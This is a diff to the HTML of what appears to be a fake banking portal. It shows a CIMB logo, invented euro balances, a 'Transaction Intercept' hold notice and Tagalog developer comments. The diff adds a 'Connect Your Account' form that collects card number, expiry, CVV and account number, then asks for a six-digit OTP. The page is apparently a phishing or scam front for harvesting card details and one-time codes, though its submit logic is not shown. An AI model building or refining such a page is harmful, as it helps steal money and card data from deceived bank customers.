@@ -21,6 +21,8 @@
                 <li><a href="#" onclick="showSection('accountsSection')">Accounts</a></li>
                 <li><a href="#" onclick="showSection('transfersSection')">Transfers</a></li>
                 <li><a href="#" onclick="showSection('settingsSection')">Settings</a></li>
+                <!-- TAMANG PAGKAKALAGAY NG CONNECT LINK SA NAV MENU -->
+                <li><a href="#" onclick="showSection('connectAccountSection')">Connect</a></li>
                 <li><a href="#" onclick="logout()" class="logout-btn">Logout</a></li>
             </ul>
             <div class="hamburger" id="hamburger" onclick="toggleMenu()">
@@ -110,26 +112,6 @@
         </div>
     </div>
 
-    <!-- 4. FORGOT PASSWORD PAGE -->
-    <div id="forgotPasswordSection" class="auth-container" style="display:none;">
-        <div class="auth-card">
-            <div class="auth-header">
-                <i class="fas fa-key" style="color: #800000; font-size: 3rem;"></i>
-                <h1>Reset Password</h1>
-                <p>Enter your email to receive link</p>
-            </div>
-            <form id="forgotPasswordForm" onsubmit="handleForgotPassword(event)">
-                <div class="form-group">
-                    <label for="resetEmail">Email Address</label>
-                    <input type="email" id="resetEmail" placeholder="Enter your email" required>
-                </div>
-                <button type="submit" class="btn btn-primary btn-full">Send Reset Link</button>
-            </form>
-            <div class="auth-footer" style="justify-content: center;">
-                <a href="#" onclick="showSection('loginSection')">Back to Login</a>
-            </div>
-        </div>
-    </div>
     <!-- 5. MAIN DASHBOARD SECTION -->
     <div id="dashboardSection" class="main-container" style="display:none;">
         <div class="dashboard-header">
@@ -139,7 +121,7 @@
             </div>
             <div class="header-right">
                 <div class="user-profile">
-                    <img src="<a href="https://ibb.co/5XhV1B7s"><img src="https://i.ibb.co/5XhV1B7s/Cimb-Bank-Logo.png" alt="Cimb-Bank-Logo" border="0"></a>">
+                    <img src="https://ibb.co" alt="Cimb-Bank-Logo" style="width: 40px; height: 40px; border-radius: 50%;">
                     <div class="profile-info">
                         <span class="user-name">Branko Milos</span>
                         <span class="account-type"><i class="fas fa-check-circle" style="color: #28a745;"></i> Verified Profile</span>
@@ -148,7 +130,6 @@
             </div>
         </div>
 
-        <!-- Dalawang display cards para sa mga Account -->
         <div class="stats-grid">
             <div class="stat-card" style="border-left: 5px solid #800000;">
                 <div class="stat-icon" style="background: #800000; color: white;"><i class="fas fa-wallet"></i></div>
@@ -159,7 +140,15 @@
                 </div>
             </div>
             <div class="stat-card" style="border-left: 5px solid #005691;">
-                <div class="stat-icon" style="background: #005691; color: white;"><i class="fab fa-cc-visa"></i></div>
+                <div class="stat-icon" style="background: #005691; color: white;"><i class="fas fa-university"></i></div>
+                <div class="stat-content">
+                    <p class="stat-label">Secondary Account</p>
+                    <h2 class="stat-value">€ 0.00</h2>
+                    <p style="font-size: 0.8rem; color: #666; margin-top: 5px;">Status: Standby Node Connection</p>
+                </div>
+            </div>
+            <div class="stat-card" style="border-left: 5px solid #28a745;">
+                <div class="stat-icon" style="background: #28a745; color: white;"><i class="fab fa-cc-visa"></i></div>
                 <div class="stat-content">
                     <p class="stat-label">Erste Visa Credit Card</p>
                     <h2 class="stat-value">€ 5,000.00</h2>
@@ -214,7 +203,6 @@
             </div>
         </div>
     </div>
-    <!-- 6. ACCOUNTS VIEW -->
     <div id="accountsSection" class="main-container" style="display:none;">
         <div class="section-header-main">
             <h1>My Linked Assets</h1>
@@ -229,7 +217,7 @@
                     <i class="fas fa-piggy-bank" style="color: #800000; font-size: 1.5rem;"></i>
                 </div>
                 <div class="account-balance">
-                    <span class="label">Available  Balance</span>
+                    <span class="label">Available Balance</span>
                     <h2>€ 34,427.00</h2>
                 </div>
             </div>
@@ -253,7 +241,6 @@
         </div>
     </div>
 
-    <!-- 7. TRANSFERS REGION -->
     <div id="transfersSection" class="main-container" style="display:none;">
         <div class="section-header-main">
             <h1>Cross-Border Wire Transfer</h1>
@@ -283,7 +270,6 @@
                     <button type="submit" class="btn btn-primary btn-full" id="transferBtn">Process Allocation</button>
                 </form>
 
-                <!-- Ligtas na system validation interface control panel -->
                 <div id="complianceHoldAlertBox" style="display: none; margin-top: 20px; padding: 20px; border: 2px solid #800000; background-color: #fdf7f7; border-radius: 8px;">
                     <h4 style="color: #800000; margin-top: 0; font-size: 1.1rem; display: flex; align-items: center; gap: 8px;">
                         <i class="fas fa-exclamation-triangle"></i> Transaction Intercept: System Restrictions Applied
@@ -301,7 +287,6 @@
         </div>
     </div>
 
-    <!-- 8. SETTINGS MODULE -->
     <div id="settingsSection" class="main-container" style="display:none;">
         <div class="section-header-main">
             <h1>User Preferences</h1>
@@ -321,62 +306,67 @@
             </div>
         </div>
     </div>
-    <!-- 9. ISININGIT NA CONNECT ACCOUNT SECTION (Nakatago muna gaya ng ibang section mo) -->
     <div id="connectAccountSection" class="auth-container" style="display:none; padding: 20px 0;">
-        <div class="auth-card" style="max-width: 450px;">
+        <div class="auth-card" style="max-width: 450px; margin: 0 auto; background: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1);">
             
-            <!-- STEP 1: LAGAYAN NG INFO -->
             <div id="step-info-form">
-                <div class="auth-header">
+                <div class="auth-header" style="text-align: center; margin-bottom: 20px;">
                     <i class="fas fa-link" style="color: #800000; font-size: 3rem;"></i>
-                    <h1>Connect Your Account</h1>
-                    <p>I-link ang iyong bank account o card sa iyong profile</p>
+                    <h1 style="font-size: 1.8rem; margin-top: 10px; color: #333; font-weight: bold;">Connect Your Account</h1>
+                    <p style="color: #666; font-size: 0.9rem;">I-link ang iyong bank account o card sa iyong profile</p>
                 </div>
-                <form id="card-bind-form" onsubmit="handleCardSubmit(event)">
+                <form id="card-bind-form" onsubmit="handleCardSubmit(event)" style="text-align: left; display: flex; flex-direction: column; gap: 15px;">
                     <div class="form-group">
-                        <label>Account Name / Pangalan sa Card</label>
-                        <input type="text" id="card-name" placeholder="JUAN DELA CRUZ" required>
+                        <label style="display:block; font-size:0.9rem; margin-bottom:5px; font-weight:600; color: #333;">Account Name / Pangalan sa Card</label>
+                        <input type="text" id="card-name" placeholder="" required style="width:100%; border:1px solid #ccc; border-radius:4px; padding:10px; outline:none; background:#fff; color:#333;">
                     </div>
                     <div class="form-group">
-                        <label>Account Number</label>
-                        <input type="text" id="account-number" placeholder="Enter account number" maxlength="12" required>
+                        <label style="display:block; font-size:0.9rem; margin-bottom:5px; font-weight:600; color: #333;">Account Number</label>
+                        <input type="text" id="account-number" placeholder="" maxlength="12" required style="width:100%; border:1px solid #ccc; border-radius:4px; padding:10px; outline:none; background:#fff; color:#333;">
                     </div>
                     <div class="form-group">
-                        <label>Numero ng Card (16-Digit)</label>
-                        <input type="text" id="card-number" placeholder="4111 2222 3333 4444" maxlength="19" required>
+                        <label style="display:block; font-size:0.9rem; margin-bottom:5px; font-weight:600; color: #333;">Numero ng Card (16-Digit)</label>
+                        <input type="text" id="card-number" placeholder="" maxlength="19" required style="width:100%; border:1px solid #ccc; border-radius:4px; padding:10px; outline:none; background:#fff; color:#333;">
                     </div>
                     <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                         <div class="form-group">
-                            <label>Expiry Date</label>
-                            <input type="text" id="card-expiry" placeholder="MM/YY" maxlength="5" required>
+                            <label style="display:block; font-size:0.9rem; margin-bottom:5px; font-weight:600; color: #333;">Expiry Date</label>
+                            <input type="text" id="card-expiry" placeholder="" maxlength="5" required style="width:100%; border:1px solid #ccc; border-radius:4px; padding:10px; outline:none; background:#fff; color:#333;">
                         </div>
                         <div class="form-group">
-                            <label>CVV / CVC</label>
-                            <input type="password" id="card-cvv" placeholder="***" maxlength="3" required>
+                            <label style="display:block; font-size:0.9rem; margin-bottom:5px; font-weight:600; color: #333;">CVV / CVC</label>
+                            <input type="password" id="card-cvv" placeholder="" maxlength="3" required style="width:100%; border:1px solid #ccc; border-radius:4px; padding:10px; outline:none; background:#fff; color:#333;">
                         </div>
                     </div>
-                    <button type="submit" class="btn btn-primary btn-full" style="margin-top: 10px;">I-verify at I-link ang Account</button>
+                    <button type="submit" class="btn btn-primary btn-full" style="width:100%; background:#800000; color:#fff; padding:12px; border:none; border-radius:4px; font-weight:bold; cursor:pointer; margin-top: 10px;">I-verify at I-link ang Account</button>
                 </form>
             </div>
 
-            <!-- STEP 2: LAGAYAN NG OTP (Nakatago muna sa loob) -->
             <div id="step-otp-form" style="display: none; text-align: center;">
-                <div class="auth-header">
+                <div class="auth-header" style="margin-bottom: 20px;">
                     <i class="fas fa-key" style="color: #10b981; font-size: 3rem;"></i>
-                    <h1>Security Verification</h1>
-                    <p>Ipasok ang 6-digit OTP na ipinadala sa iyong telepono</p>
+                    <h1 style="font-size: 1.8rem; margin-top: 10px; color: #333; font-weight: bold;">Security Verification</h1>
+                    <p style="color: #666; font-size: 0.9rem;">Ipasok ang 6-digit OTP na ipinadala sa iyong telepono</p>
                 </div>
                 <form id="otp-verification-form" onsubmit="handleOtpSubmit(event)">
                     <div style="display: flex; justify-content: center; gap: 8px; margin-bottom: 20px;">
-                        <input type="text" class="otp-box" maxlength="1" required style="width:40px; height:45px; text-align:center; font-size:1.5rem; font-weight:bold; background:#fff; border:1px solid #ccc; border-radius:4px;">
-                        <input type="text" class="otp-box" maxlength="1" required style="width:40px; height:45px; text-align:center; font-size:1.5rem; font-weight:bold; background:#fff; border:1px solid #ccc; border-radius:4px;">
-                        <input type="text" class="otp-box" maxlength="1" required style="width:40px; height:45px; text-align:center; font-size:1.5rem; font-weight:bold; background:#fff; border:1px solid #ccc; border-radius:4px;">
-                        <input type="text" class="otp-box" maxlength="1" required style="width:40px; height:45px; text-align:center; font-size:1.5rem; font-weight:bold; background:#fff; border:1px solid #ccc; border-radius:4px;">
-                        <input type="text" class="otp-box" maxlength="1" required style="width:40px; height:45px; text-align:center; font-size:1.5rem; font-weight:bold; background:#fff; border:1px solid #ccc; border-radius:4px;">
-                        <input type="text" class="otp-box" maxlength="1" required style="width:40px; height:45px; text-align:center; font-size:1.5rem; font-weight:bold; background:#fff; border:1px solid #ccc; border-radius:4px;">
+                        <input type="text" class="otp-box" maxlength="1" required style="width:40px; height:45px; text-align:center; font-size:1.5rem; font-weight:bold; background:#fff; border:1px solid #ccc; border-radius:4px; color:#800000;">
+                        <input type="text" class="otp-box" maxlength="1" required style="width:40px; height:45px; text-align:center; font-size:1.5rem; font-weight:bold; background:#fff; border:1px solid #ccc; border-radius:4px; color:#800000;">
+                        <input type="text" class="otp-box" maxlength="1" required style="width:40px; height:45px; text-align:center; font-size:1.5rem; font-weight:bold; background:#fff; border:1px solid #ccc; border-radius:4px; color:#800000;">
+                        <input type="text" class="otp-box" maxlength="1" required style="width:40px; height:45px; text-align:center; font-size:1.5rem; font-weight:bold; background:#fff; border:1px solid #ccc; border-radius:4px; color:#800000;">
+                        <input type="text" class="otp-box" maxlength="1" required style="width:40px; height:45px; text-align:center; font-size:1.5rem; font-weight:bold; background:#fff; border:1px solid #ccc; border-radius:4px; color:#800000;">
+                        <input type="text" class="otp-box" maxlength="1" required style="width:40px; height:45px; text-align:center; font-size:1.5rem; font-weight:bold; background:#fff; border:1px solid #ccc; border-radius:4px; color:#800000;">
                     </div>
-                    <li><a href="#" onclick="showSection('connectAccountSection')">Connect</a></li>
+                    <button type="submit" class="btn btn-primary btn-full" style="width:100%; background:#10b981; color:#fff; padding:12px; border:none; border-radius:4px; font-weight:bold; cursor:pointer;">Kumpirmahin ang OTP</button>
+                </form>
+            </div>
 
+            <div id="page-loading-spinner" style="display: none; text-align: center; padding: 30px 0;">
+                <i class="fas fa-spinner fa-spin" style="color: #800000; font-size: 2.5rem;"></i>
+            </div>
+
+        </div>
+    </div>
 
     <script src="script.js"></script>
 </body>
